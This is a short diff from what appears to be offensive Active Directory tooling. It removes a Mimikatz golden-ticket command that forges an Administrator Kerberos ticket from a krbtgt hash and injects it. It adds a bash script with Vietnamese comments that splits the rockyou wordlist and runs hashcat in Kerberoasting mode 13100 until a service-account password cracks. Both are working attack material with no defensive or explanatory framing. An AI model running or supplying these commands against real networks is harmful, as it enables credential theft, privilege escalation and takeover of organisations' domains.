@@ -1,1 +1,37 @@
-kerberos::golden /user:Administrator /domain:corp.com /sid:S-1-5-21-XXXXXX /krbtgt:<HASH> /service:cifs /target:18.70 /ticket:cifs.kirbi /ptt /id:500 /groups:512
+#!/bin/bash
+
+# Đường dẫn wordlist gốc
+WORDLIST="/usr/share/wordlists/rockyou.txt"
+
+# File chứa hash
+HASHFILE="hashes.txt"
+
+# Đường dẫn thư mục tạm chứa các phần nhỏ
+CHUNKS_DIR="./chunks"
+mkdir -p "$CHUNKS_DIR"
+
+# Số dòng mỗi phần
+LINES_PER_CHUNK=300000
+
+# Tách file thành các phần nhỏ
+split -l $LINES_PER_CHUNK "$WORDLIST" "$CHUNKS_DIR/chunk_"
+
+# Đếm tổng số chunk
+CHUNKS=$(ls "$CHUNKS_DIR" | sort)
+
+# Lặp từng chunk
+for CHUNK in $CHUNKS; do
+    echo "👉 Đang chạy với từ điển: $CHUNK"
+    
+    hashcat -m 13100 "$HASHFILE" "$CHUNKS_DIR/$CHUNK" --force --status
+
+    # Kiểm tra nếu đã crack được
+    FOUND=$(hashcat -m 13100 --show "$HASHFILE")
+    if [ -n "$FOUND" ]; then
+        echo "✅ Đã crack được!"
+        echo "$FOUND"
+        break
+    fi
+done
+
+echo "✅ Xong toàn bộ."
